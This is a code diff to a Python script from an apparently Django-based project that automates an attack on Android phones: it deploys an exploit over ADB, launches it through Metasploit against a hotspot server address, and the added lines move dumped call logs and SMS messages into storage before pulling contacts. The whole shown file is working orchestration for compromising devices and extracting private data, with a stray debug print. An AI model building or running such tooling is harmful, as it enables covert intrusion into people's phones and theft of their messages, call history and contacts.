@@ -1,16 +1,17 @@
-from . import AdbHandler, HotspotHandler, LogHandler, MsfHandler, DEPENDENCY_PATH, ARTIFACTS_PATH
+from . import AdbHandler, HotspotHandler, LogHandler, MsfHandler, DEPENDENCY_PATH, ARTIFACTS_PATH, FILE_PATH
 import time
 import os
 import json
-import functools
 import django
 import sys
+import re
+import shutil
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ArgusAPI.settings')
 django.setup()
 
-from API.models import ADBStatus
+from ArgusAPI.settings import STORAGE_ROOT
 
 def execute_script(x: str, adb_handler: AdbHandler.AdbHandler):
     """
@@ -50,8 +51,13 @@ def execute_script(x: str, adb_handler: AdbHandler.AdbHandler):
         adb_handler.deploy_exploit()
         # launch the exploit
         metasploit_handler.launch_exploit(hotspothandler.server_ip)
-        # Copy the exported call logs and sms to our artifacts folder
-        # TODO: Ashwanth decide location
+        # Move the sms and callogs dumps
+        for file in (os.listdir(os.path.expanduser("~"))):
+            if (re.match("calllog_dump_[0-9]*.txt", file)):
+                print("sdfhsdohfosdi")
+                os.rename(os.path.expanduser("~")+"/"+file, STORAGE_ROOT+"/data/calllog.txt")
+            if (re.match("sms_dump_[0-9]*.txt", file)):
+                os.rename(os.path.expanduser("~")+"/"+file, STORAGE_ROOT+"/data/sms.txt")
         # run adb command to get contacts
         adb_handler.get_contacts()
         # update the JSON file that we have synced all data
@@ -66,11 +72,10 @@ def execute_script(x: str, adb_handler: AdbHandler.AdbHandler):
 
 def start_payload():
     # start the adb server
-    print("into the upload function")
     adb_handler = AdbHandler.AdbHandler()
     adb_handler.stop_server()
     adb_handler.start_server()
-    time.sleep(2)
+    time.sleep(1)
     # adb_handler.get_files()
     # notify if a device is connected
     adb_handler.notify_if_device_connected(execute_script, adb_handler)
